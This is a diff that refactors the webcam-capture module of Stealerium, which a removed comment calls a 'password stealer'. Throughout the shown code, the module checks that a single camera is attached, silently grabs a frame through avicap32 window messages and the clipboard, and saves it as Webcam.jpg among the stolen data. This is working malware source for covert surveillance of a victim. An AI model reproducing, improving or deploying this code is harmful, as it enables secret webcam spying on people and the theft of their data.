@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.IO;
 using System.Management;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -12,7 +13,7 @@ namespace Stealerium.Target.System
     internal sealed class WebcamScreenshot
     {
         private static IntPtr _handle;
-        private static readonly int delay = 3000;
+        private static readonly int Delay = 3000;
 
         [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
         private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y,
@@ -21,19 +22,19 @@ namespace Stealerium.Target.System
         [DllImport("user32", EntryPoint = "SendMessage")]
         private static extern int SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
 
-
-        // Get connected cameras count
+        // Get the count of connected cameras
         public static int GetConnectedCamerasCount()
         {
             var cameras = 0;
             try
             {
-                using (var searcher =
-                       new ManagementObjectSearcher(
+                using (var searcher = new ManagementObjectSearcher(
                            "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
                 {
-                    foreach (var dummy in searcher.Get())
+                    foreach (var _ in searcher.Get())
+                    {
                         cameras++;
+                    }
                 }
             }
             catch
@@ -44,43 +45,57 @@ namespace Stealerium.Target.System
             return cameras;
         }
 
-        // Create screenshot for password stealer
+        // Create a webcam screenshot
         public static bool Make(string sSavePath)
         {
-            // If webcam disabled => skip
+            // Check if webcam screenshots are enabled
             if (Config.WebcamScreenshot != "1")
+            {
                 return false;
+            }
 
-            // If connected one camera
-            var count = GetConnectedCamerasCount();
-            if (count != 1)
-                return Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {count})", false);
+            // Check if exactly one camera is connected
+            var cameraCount = GetConnectedCamerasCount();
+            if (cameraCount != 1)
+            {
+                return Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {cameraCount})", false);
+            }
 
             try
             {
+                // Clear the clipboard before use
                 Clipboard.Clear();
+
+                // Initialize webcam capture window
                 _handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
-                // Initialize webcamera
-                SendMessage(_handle, 1034, 0, 0);
-                SendMessage(_handle, 1074, 0, 0);
-                // Delay
-                Thread.Sleep(delay);
-                // Capture frame
-                SendMessage(_handle, 1084, 0, 0);
-                SendMessage(_handle, 1054, 0, 0);
-                // Stop webcamera
-                SendMessage(_handle, 1035, 0, 0);
-                // Save
-                var image = (Image)Clipboard.GetDataObject()
-                    ?.GetData(DataFormats.Bitmap);
+
+                // Initialize the webcam
+                SendMessage(_handle, 1034, 0, 0); // WM_CAP_DRIVER_CONNECT
+                SendMessage(_handle, 1074, 0, 0); // WM_CAP_SET_PREVIEW
+
+                // Allow some time for the camera to initialize
+                Thread.Sleep(Delay);
+
+                // Capture a frame
+                SendMessage(_handle, 1084, 0, 0); // WM_CAP_GRAB_FRAME
+                SendMessage(_handle, 1054, 0, 0); // WM_CAP_EDIT_COPY
+
+                // Stop the webcam
+                SendMessage(_handle, 1035, 0, 0); // WM_CAP_DRIVER_DISCONNECT
+
+                // Get the captured image from the clipboard
+                var image = (Image)Clipboard.GetDataObject()?.GetData(DataFormats.Bitmap);
                 Clipboard.Clear();
+
+                // Save the image if it was captured successfully
                 if (image != null)
                 {
-                    image.Save(sSavePath + "\\Webcam.jpg", ImageFormat.Jpeg);
+                    var savePath = Path.Combine(sSavePath, "Webcam.jpg");
+                    image.Save(savePath, ImageFormat.Jpeg);
                     image.Dispose();
-                }
 
-                Counter.WebcamScreenshot = true;
+                    Counter.WebcamScreenshot = true;
+                }
             }
             catch (Exception ex)
             {
